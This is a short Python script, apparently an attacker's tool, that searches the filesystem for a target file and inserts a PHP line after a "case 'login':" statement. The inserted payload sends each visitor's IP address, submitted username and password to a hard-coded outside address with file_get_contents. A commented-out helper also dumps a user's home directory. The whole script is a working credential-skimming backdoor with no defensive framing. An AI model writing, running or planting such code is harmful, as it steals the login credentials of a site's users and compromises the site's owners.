#!/usr/bin/env python3

import os

def enum_home(path):
    for item in os.listdir(path):
        #print(path)
        new_path = f'{path}/{item}'
        try:
            if os.path.isdir(new_path):
                print(f'Dir: {item}')
                enum_home(new_path)
            else:
                print(f'filename: {new_path}')
        except:
            pass

def get_path(f_name):
    f_path = None
    breaker = False
    for root, dirs, files in os.walk('/',topdown=True):
        for name in files:
            if name == f_name:
                f_path = os.path.abspath(os.path.join(root, name))
                breaker = True 
                # edit the file
                return f_path
                break
        if breaker:
            break 
    if not f_path:
        print(f'Cant find the File {f_name} on the System')
        exit(-1)

def insertAfter(haystack, needle, newText):
            #""" Inserts 'newText' into 'haystack' right after 'needle'. """
            i = haystack.find(needle)
            return haystack[:i + len(needle)] + newText + haystack[i + len(needle):]

def main():

    #enum_home('/home/bob') # Dump Files form folder

    f_path = get_path('test.abc') # Find File on the system
    print(f_path)

    payload = "file_get_contents('http://192.168.178.107/x?' . $_SERVER['REMOTE_ADDR'] . ' - ' . $_POST['log'] . ':' . $_POST['pwd']);"
    place = "case 'login':"
    
    a_file = open(f_path, "r")
    data = a_file.readlines()
    for index, line in enumerate(data, start=0):
        if place in line:
            t = line.rstrip().replace(place,'')
            
            data[index]=f'{line.rstrip()}\n{t}\t{payload}\n'

    #print(data)
    a_file = open('out', "w")
    a_file.writelines(data)
    a_file.close()

    
if __name__ == '__main__':

    main()